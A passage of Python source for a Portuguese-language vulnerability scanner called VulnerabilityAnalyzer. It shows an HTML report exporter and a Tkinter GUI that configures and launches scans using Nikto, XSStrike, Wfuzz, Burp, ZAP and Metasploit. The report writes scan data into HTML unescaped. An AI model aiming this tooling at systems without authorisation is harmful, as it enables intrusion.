    report_path = os.path.join(Settings['ReportDir'], f'report_{int(time.time())}.html')
    template_path = os.path.join(Settings['ReportDir'], 'report_template.html')
    
    # Criar template HTML se não existir
    if not os.path.exists(template_path):
        with open(template_path, 'w') as f:
            f.write('''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VulnerabilityAnalyzer Report</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f0f0f0; }
        h1 { color: #4CAF50; }
        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #4CAF50; color: white; }
        tr:nth-child(even) { background-color: #f2f2f2; }
        #vulnChart { max-width: 600px; margin: 20px 0; }
        .section { margin-bottom: 20px; }
    </style>
</head>
<body>
    <h1>VulnerabilityAnalyzer Report</h1>
    <div class="section">
        <h2>Summary</h2>
        <p><strong>Timestamp:</strong> {{timestamp}}</p>
        <p><strong>Total Vulnerabilities:</strong> {{total_vulns}}</p>
        <p><strong>Total Scans:</strong> {{total_scans}}</p>
    </div>
    <div class="section">
        <h2>Vulnerability Distribution</h2>
        <canvas id="vulnChart"></canvas>
    </div>
    <div class="section">
        <h2>Results</h2>
        {{results_table}}
    </div>
    <div class="section">
        <h2>Subdomains Found</h2>
        <p>{{subdomains}}</p>
    </div>
    <script>
        const ctx = document.getElementById('vulnChart').getContext('2d');
        new Chart(ctx, {
            type: 'bar',
            data: {
                labels: {{vuln_labels}},
                datasets: [{
                    label: 'Vulnerabilities',
                    data: {{vuln_data}},
                    backgroundColor: '#4CAF50',
                    borderColor: '#45a049',
                    borderWidth: 1
                }]
            },
            options: {
                scales: {
                    y: { beginAtZero: true }
                }
            }
        });
    </script>
</body>
</html>
            ''')

    # Gerar relatório HTML
    vuln_types = {}
    for vuln in ScriptState['Vulnerabilities']:
        vuln_type = vuln[0]
        vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
    
    results_table = '<table><tr><th>Type</th><th>Description</th><th>Details</th></tr>'
    for target, data in ScriptState['Results'].items():
        for vuln in data['vulns'] + [v for v in ScriptState['Vulnerabilities'] if v[2] == target]:
            results_table += f'<tr><td>{vuln[0]}</td><td>{vuln[1]}</td><td>{vuln[2]}</td></tr>'
    results_table += '</table>'
    
    with open(template_path, 'r') as f:
        template = f.read()
    
    html_content = template.replace('{{timestamp}}', time.strftime('%Y-%m-%d %H:%M:%S'))
    html_content = html_content.replace('{{total_vulns}}', str(ScriptState['TotalVulnsFound']))
    html_content = html_content.replace('{{total_scans}}', str(ScriptState['TotalScans']))
    html_content = html_content.replace('{{results_table}}', results_table)
    html_content = html_content.replace('{{subdomains}}', ', '.join(ScriptState['Subdomains']) or 'None')
    html_content = html_content.replace('{{vuln_labels}}', json.dumps(list(vuln_types.keys())))
    html_content = html_content.replace('{{vuln_data}}', json.dumps(list(vuln_types.values())))
    
    with open(report_path, 'w') as f:
        f.write(html_content)
    log_message('INFO', f'Relatório HTML salvo em {report_path}')

# GUI com Tkinter (moderna com abas)
class VulnerabilityAnalyzerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title('VulnerabilityAnalyzer - Inflavelle (2025)')
        self.root.geometry('1000x700')
        self.root.configure(bg='#f0f0f0')
        
        # Estilo moderno
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('TButton', padding=6, relief='flat', background='#4CAF50', foreground='white')
        style.map('TButton', background=[('active', '#45a049')])
        style.configure('TCheckbutton', background='#f0f0f0')
        style.configure('TLabel', background='#f0f0f0', font=('Arial', 10))

        # Notebook (abas)
        self.notebook = ttk.Notebook(root)
        self.notebook.pack(pady=10, padx=10, fill='both', expand=True)

        # Aba de Configurações
        self.config_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.config_frame, text='Configurações')

        ttk.Label(self.config_frame, text='VulnerabilityAnalyzer', font=('Arial', 16, 'bold')).pack(pady=10)
        
        # Entradas
        ttk.Label(self.config_frame, text='Targets (URLs ou IPs, separados por vírgula):').pack()
        self.target_entry = ttk.Entry(self.config_frame, width=60)
        self.target_entry.insert(0, ','.join(Settings['Targets']))
        self.target_entry.pack(pady=5)

        ttk.Label(self.config_frame, text='Intervalo de Portas (ex.: 1-1000):').pack()
        self.port_entry = ttk.Entry(self.config_frame, width=20)
        self.port_entry.insert(0, f"{Settings['PortRange'][0]}-{Settings['PortRange'][1]}")
        self.port_entry.pack(pady=5)

        ttk.Label(self.config_frame, text='Threads:').pack()
        self.threads_entry = ttk.Entry(self.config_frame, width=10)
        self.threads_entry.insert(0, str(Settings['Threads']))
        self.threads_entry.pack(pady=5)

        ttk.Label(self.config_frame, text='XSStrike Path:').pack()
        self.xsstrike_entry = ttk.Entry(self.config_frame, width=60)
        self.xsstrike_entry.insert(0, Settings['XSStrikePath'])
        self.xsstrike_entry.pack(pady=5)

        ttk.Label(self.config_frame, text='Nikto Path:').pack()
        self.nikto_entry = ttk.Entry(self.config_frame, width=60)
        self.nikto_entry.insert(0, Settings['NiktoPath'])
        self.nikto_entry.pack(pady=5)

        ttk.Label(self.config_frame, text='Wfuzz Path:').pack()
        self.wfuzz_entry = ttk.Entry(self.config_frame, width=60)
        self.wfuzz_entry.insert(0, Settings['WfuzzPath'])
        self.wfuzz_entry.pack(pady=5)

        ttk.Label(self.config_frame, text='Wordlist Path (Wfuzz):').pack()
        self.wordlist_entry = ttk.Entry(self.config_frame, width=60)
        self.wordlist_entry.insert(0, Settings['WordlistPath'])
        self.wordlist_entry.pack(pady=5)

        ttk.Label(self.config_frame, text='Burp Suite API URL:').pack()
        self.burp_url_entry = ttk.Entry(self.config_frame, width=60)
        self.burp_url_entry.insert(0, Settings['BurpApiUrl'])
        self.burp_url_entry.pack(pady=5)

        ttk.Label(self.config_frame, text='Burp Suite API Key:').pack()
        self.burp_key_entry = ttk.Entry(self.config_frame, width=60)
        self.burp_key_entry.insert(0, Settings['BurpApiKey'])
        self.burp_key_entry.pack(pady=5)

        ttk.Label(self.config_frame, text='OWASP ZAP API URL:').pack()
        self.zap_url_entry = ttk.Entry(self.config_frame, width=60)
        self.zap_url_entry.insert(0, Settings['ZAPApiUrl'])
        self.zap_url_entry.pack(pady=5)

        ttk.Label(self.config_frame, text='OWASP ZAP API Key:').pack()
        self.zap_key_entry = ttk.Entry(self.config_frame, width=60)
        self.zap_key_entry.insert(0, Settings['ZAPApiKey'])
        self.zap_key_entry.pack(pady=5)

        ttk.Label(self.config_frame, text='Metasploit Host:').pack()
        self.metasploit_host_entry = ttk.Entry(self.config_frame, width=60)
        self.metasploit_host_entry.insert(0, Settings['MetasploitHost'])
        self.metasploit_host_entry.pack(pady=5)

        ttk.Label(self.config_frame, text='Metasploit Port:').pack()
        self.metasploit_port_entry = ttk.Entry(self.config_frame, width=20)
        self.metasploit_port_entry.insert(0, str(Settings['MetasploitPort']))
        self.metasploit_port_entry.pack(pady=5)

        ttk.Label(self.config_frame, text='Metasploit User:').pack()
        self.metasploit_user_entry = ttk.Entry(self.config_frame, width=60)
        self.metasploit_user_entry.insert(0, Settings['MetasploitUser'])
        self.metasploit_user_entry.pack(pady=5)

        ttk.Label(self.config_frame, text='Metasploit Password:').pack()
        self.metasploit_pass_entry = ttk.Entry(self.config_frame, width=60, show='*')
        self.metasploit_pass_entry.insert(0, Settings['MetasploitPass'])
        self.metasploit_pass_entry.pack(pady=5)

        ttk.Label(self.config_frame, text='Subdomains (separados por vírgula):').pack()
        self.subdomain_entry = ttk.Entry(self.config_frame, width=60)
        self.subdomain_entry.insert(0, ','.join(Settings['SubdomainList']))
        self.subdomain_entry.pack(pady=5)

        # Testes
        ttk.Label(self.config_frame, text='Testes:').pack(pady=5)
        self.check_vars = {
            'SQLi': tk.BooleanVar(value=Settings['CheckSQLi']),
            'XSS': tk.BooleanVar(value=Settings['CheckXSS']),
            'CSRF': tk.BooleanVar(value=Settings['CheckCSRF']),
            'SSRF': tk.BooleanVar(value=Settings['CheckSSRF']),
            'LFI': tk.BooleanVar(value=Settings['CheckLFI']),
            'RFI': tk.BooleanVar(value=Settings['CheckRFI']),
            'Headers': tk.BooleanVar(value=Settings['CheckHeaders']),
            'CMS': tk.BooleanVar(value=Settings['CheckCMS']),
            'Subdomains': tk.BooleanVar(value=Settings['CheckSubdomains']),
            'XSStrike': tk.BooleanVar(value=Settings['CheckXSStrike']),
            'Nikto': tk.BooleanVar(value=Settings['CheckNikto']),
            'Burp': tk.BooleanVar(value=Settings['CheckBurp']),
            'API': tk.BooleanVar(value=Settings['CheckAPI']),
            'AdvancedAPI': tk.BooleanVar(value=Settings['CheckAdvancedAPI']),
            'GraphQL': tk.BooleanVar(value=Settings['CheckGraphQL']),
            'Wfuzz': tk.BooleanVar(value=Settings['CheckWfuzz']),
            'ZAP': tk.BooleanVar(value=Settings['CheckZAP']),
            'Metasploit': tk.BooleanVar(value=Settings['CheckMetasploit']),
            'OS': tk.BooleanVar(value=Settings['FingerprintOS']),
            'JSON': tk.BooleanVar(value=Settings['ExportJSON']),
            'PDF': tk.BooleanVar(value=Settings['ExportPDF']),
            'CSV': tk.BooleanVar(value=Settings['ExportCSV']),
            'HTML': tk.BooleanVar(value=Settings['ExportHTML'])
        }
        test_frame = ttk.Frame(self.config_frame)
        test_frame.pack()
        for i, (name, var) in enumerate(self.check_vars.items()):
            ttk.Checkbutton(test_frame, text=name, variable=var).grid(row=i//4, column=i%4, padx=5, pady=2, sticky='w')

        # Aba de Progresso
        self.progress_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.progress_frame, text='Progresso')

        self.progress_var = tk.StringVar(value='Progresso: 0 vulnerabilidades encontradas')
        ttk.Label(self.progress_frame, textvariable=self.progress_var, font=('Arial', 12)).pack(pady=10)

        self.progress_bar = ttk.Progressbar(self.progress_frame, length=400, mode='determinate')
        self.progress_bar.pack(pady=5)

        # Aba de Resultados
        self.result_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.result_frame, text='Resultados')

        self.result_text = tk.Text(self.result_frame, height=15, width=80, bg='#ffffff', fg='#000000')
        self.result_text.pack(pady=10, padx=10)

        # Botões
        button_frame = ttk.Frame(self.result_frame)
        button_frame.pack(pady=5)
        ttk.Button(button_frame, text='Iniciar Varredura', command=self.start_scan).pack(side='left', padx=5)
        ttk.Button(button_frame, text='Parar Varredura', command=self.stop_scan).pack(side='left', padx=5)
        ttk.Button(button_frame, text='Salvar Configurações', command=self.save_settings).pack(side='left', padx=5)
        ttk.Button(button_frame, text='Visualizar Gráficos', command=self.show_graphs).pack(side='left', padx=5)
        ttk.Button(button_frame, text='Exportar Relatórios', command=self.export_reports).pack(side='left', padx=5)

    def log(self, message):
        level = message.split('[')[1].split(']')[0] if '[' in message else 'INFO'
        color = {'CRITICAL': 'red', 'WARNING': 'orange', 'INFO': 'black', 'ERROR': 'red'}.get(level, 'black')
        self.result_text.tag_configure(level, foreground=color)
        self.result_text.insert(tk.END, f"{message}\n", level)
        self.result_text.see(tk.END)

    def update_progress(self):
        total_items = (Settings['PortRange'][1] - Settings['PortRange'][0] + 1) * len(Settings['Targets'])
        progress = (ScriptState['TotalScans'] / total_items) * 100 if total_items > 0 else 0
        self.progress_bar['value'] = progress
        self.progress_var.set(f'Progresso: {ScriptState["TotalVulnsFound"]} vulnerabilidades, {ScriptState["TotalScans"]}/{total_items} portas')
        self.root.update()

    def show_graphs(self):
        fig, ax = plt.subplots(figsize=(8, 5))
        vuln_types = {}
        for vuln in ScriptState['Vulnerabilities']:
            vuln_type = vuln[0]
            vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
        
        if vuln_types:
            ax.bar(vuln_types.keys(), vuln_types.values(), color='#4CAF50')
            ax.set_title('Distribuição de Vulnerabilidades', fontsize=14)
            ax.set_xlabel('Tipo de Vulnerabilidade', fontsize=12)
            ax.set_ylabel('Quantidade', fontsize=12)
            plt.xticks(rotation=45, ha='right')
            
            window = tk.Toplevel(self.root)
            window.title('Gráficos de Vulnerabilidades')
            canvas = FigureCanvasTkAgg(fig, master=window)
            canvas.draw()
            canvas.get_tk_widget().pack(fill='both', expand=True)
        else:
            messagebox.showinfo('Gráficos', 'Nenhuma vulnerabilidade encontrada para exibir.')

    def start_scan(self):
        if ScriptState['IsRunning']:
            messagebox.showerror('Erro', 'Varredura já em andamento!')
            return
        ScriptState['IsRunning'] = True
        ScriptState['Vulnerabilities'] = []
        ScriptState['Subdomains'] = []
        ScriptState['Results'] = {}
        ScriptState['TotalVulnsFound'] = 0
        ScriptState['TotalScans'] = 0
        self.progress_bar['value'] = 0
        self.save_settings()

        try:
            targets = [t.strip() for t in self.target_entry.get().split(',')]
            if not targets:
                raise ValueError("Nenhum alvo especificado.")
            url_regex = re.compile(r'^(https?://)?[a-zA-Z0-9.-]+(:[0-9]+)?(/[a-zA-Z0-9._/-]*)?$|^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$')
            for target in targets:
                if not url_regex.match(target):
                    raise ValueError(f"Alvo inválido: {target}")
                ScriptState['Results'][target] = {'ports': [], 'vulns': []}
                threading.Thread(target=scan_target, args=(target,), daemon=True).start()
                self.log(f'Varredura iniciada em {target}')
            
            threading.Thread(target=self.monitor_progress, daemon=True).start()
        except Exception as e:
            messagebox.showerror('Erro', f'Erro ao iniciar varredura: {e}')
            ScriptState['IsRunning'] = False

    def monitor_progress(self):
        while ScriptState['IsRunning']:
            self.update_progress()
            time.sleep(1)
        self.update_progress()
        if ScriptState['TotalVulnsFound'] > 0:
            self.log(f'Varredura concluída. {ScriptState["TotalVulnsFound"]} vulnerabilidades encontradas.')
        else:
            self.log('Varredura concluída. Nenhuma vulnerabilidade encontrada.')

    def stop_scan(self):
        ScriptState['IsRunning'] = False
        self.log('Varredura parada.')
        self.export_reports()

    def save_settings(self):
        try:
            Settings['Targets'] = [t.strip() for t in self.target_entry.get().split(',')]
            port_range = self.port_entry.get().split('-')
            if len(port_range) != 2 or not all(p.isdigit() for p in port_range):
                raise ValueError("Intervalo de portas inválido. Use formato: 1-1000")
            Settings['PortRange'] = tuple(map(int, port_range))
            if not self.threads_entry.get().isdigit():
                raise ValueError("Número de threads deve ser um inteiro.")
            Settings['Threads'] = int(self.threads_entry.get())
            Settings['XSStrikePath'] = self.xsstrike_entry.get()
            Settings['NiktoPath'] = self.nikto_entry.get()
            Settings['WfuzzPath'] = self.wfuzz_entry.get()
            Settings['WordlistPath'] = self.wordlist_entry.get()
            Settings['BurpApiUrl'] = self.burp_url_entry.get()
            Settings['BurpApiKey'] = self.burp_key_entry.get()
            Settings['ZAPApiUrl'] = self.zap_url_entry.get()
            Settings['ZAPApiKey'] = self.zap_key_entry.get()
            Settings['MetasploitHost'] = self.metasploit_host_entry.get()
            if not self.metasploit_port_entry.get().isdigit():
                raise ValueError("Porta do Metasploit deve ser um inteiro.")
            Settings['MetasploitPort'] = int(self.metasploit_port_entry.get())
            Settings['MetasploitUser'] = self.metasploit_user_entry.get()
            Settings['MetasploitPass'] = self.metasploit_pass_entry.get()
            Settings['SubdomainList'] = [s.strip() for s in self.subdomain_entry.get().split(',')]
            for name, var in self.check_vars.items():
                Settings[f'Check{name}'] = var.get()
            self.log('Configurações salvas.')
        except Exception as e:
            messagebox.showerror('Erro', f'Erro ao salvar configurações: {e}')

    def export_reports(self):
        try:
            if self.check_vars['JSON'].get():
                export_json_report()
            if self.check_vars['PDF'].get():
                export_pdf_report()
            if self.check_vars['CSV'].get():
                export_csv_report()
            if self.check_vars['HTML'].get():
                export_html_report()
            self.log('Relatórios exportados com sucesso.')
        except Exception as e:
            messagebox.showerror('Erro', f'Erro ao exportar relatórios: {e}')

# Iniciar GUI
if __name__ == '__main__':
    if platform.system() in ['Windows', 'Linux']:
        root = tk.Tk()
        app = VulnerabilityAnalyzerGUI(root)
        root.mainloop()
    else:
        print("Sistema operacional não suportado. Use Windows ou Linux.")